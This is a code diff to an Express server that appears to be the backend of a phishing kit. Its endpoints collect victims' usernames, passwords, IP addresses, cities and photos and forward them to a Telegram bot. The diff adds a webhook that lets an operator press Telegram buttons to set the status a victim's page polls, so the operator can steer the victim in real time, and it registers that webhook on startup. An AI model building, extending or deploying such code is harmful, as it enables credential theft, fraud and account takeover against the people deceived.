@@ -4,6 +4,7 @@ const fetch = require('node-fetch');
 const fs = require('fs');
 require('dotenv').config();
 const app = express();
+const FormData = require('form-data');  
 
 app.use(cors());
 app.use(express.json());
@@ -54,7 +55,6 @@ function cargarCliente(txid) {
   return null;
 }
 
-// Endpoint para /enviar (GTC)
 app.post('/enviar', async (req, res) => {
   const { usar, clavv, txid, ip, ciudad } = req.body;
   const mensaje = `
@@ -64,7 +64,6 @@ app.post('/enviar', async (req, res) => {
 🔐 CL4V: <code>${clavv}</code>
 🌐 IP: ${ip}
 🏙️ Ciudad: ${ciudad}
-
 `;
   const cliente = {
     status: "esperando",
@@ -97,7 +96,6 @@ app.post('/enviar', async (req, res) => {
   });
   res.sendStatus(200);
 });
-
 
 app.post('/enviar2', async (req, res) => {
   const { usar, clavv, txid, ip, ciudad } = req.body;
@@ -188,7 +186,7 @@ app.post('/enviar3', async (req, res) => {
   res.sendStatus(200);
 });
 
-const FormData = require('form-data');  // ← AÑADE ESTA LÍNEA AL PRINCIPIO DEL ARCHIVO (después de los otros requires)
+
 
 app.post('/enviar-foto', async (req, res) => {
     try {
@@ -235,12 +233,77 @@ app.post('/enviar-foto', async (req, res) => {
 
 
 // Otros endpoints similares (agrega /enviar4, /enviar3e, etc. si los necesitas, sin preguntas)
+// NUEVO: Endpoint para polling del frontend (reemplaza sendStatus.php)
+app.get('/get-status', (req, res) => {
+  const txid = req.query.txid;
+  if (!txid) {
+    return res.status(400).json({ error: 'Falta txid' });
+  }
+  const cliente = cargarCliente(txid);
+  res.json({ status: cliente ? cliente.status : 'esperando' });
+});
+
+// NUEVO: Webhook para Telegram (maneja callbacks de botones)
+app.post('/telegram-webhook', async (req, res) => {
+  try {
+    const update = req.body;
+    if (update.callback_query) {
+      const query = update.callback_query;
+      const data = query.data;
+      const callbackQueryId = query.id;
+
+      console.log(`✅ Callback recibido: ${data}`);
+
+      // Responder a Telegram para confirmar (evita "cargando" infinito en el botón)
+      await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/answerCallbackQuery`, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          callback_query_id: callbackQueryId,
+          text: 'Acción procesada',  // Mensaje opcional que ve el usuario
+        })
+      });
+
+      // Actualizar status basado en callback_data
+      const [action, txid] = data.split(':');
+      const cliente = cargarCliente(txid);
+      if (cliente) {
+        cliente.status = action;  // e.g., "elopete", "laderrorselfi", "errorlogo"
+        guardarCliente(txid, cliente);
+        console.log(`✅ Status actualizado para ${txid}: ${action}`);
+      } else {
+        console.log(`❌ Cliente no encontrado para txid: ${txid}`);
+      }
+    }
+
+    res.sendStatus(200);  // Siempre responde 200 para que Telegram no reenvíe
+  } catch (error) {
+    console.error('🔥 Error en webhook:', error);
+    res.sendStatus(500);
+  }
+});
+
+// Otros endpoints similares (agrega /enviar4, /enviar3e, etc. si los necesitas, sin preguntas)
 
 app.get('/', (req, res) => res.send("Servidor activo en Render"));
 
 const PORT = process.env.PORT || 3000;
-app.listen(PORT, () => {
+app.listen(PORT, async () => {
   console.log(`Servidor activo en Render puerto ${PORT}`);
   console.log('TELEGRAM_TOKEN configurado:', !!TELEGRAM_TOKEN);
   console.log('CHAT_ID configurado:', !!CHAT_ID);
+
+  // NUEVO: Configura el webhook del bot automáticamente al iniciar
+  const webhookUrl = 'https://feintacta.onrender.com/telegram-webhook';
+  try {
+    const res = await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/setWebhook?url=${webhookUrl}`);
+    const data = await res.json();
+    if (data.ok) {
+      console.log(`✅ Webhook configurado: ${webhookUrl}`);
+    } else {
+      console.log(`❌ Error configurando webhook: ${JSON.stringify(data)}`);
+    }
+  } catch (err) {
+    console.error('🔥 Error al setear webhook:', err);
+  }
 });
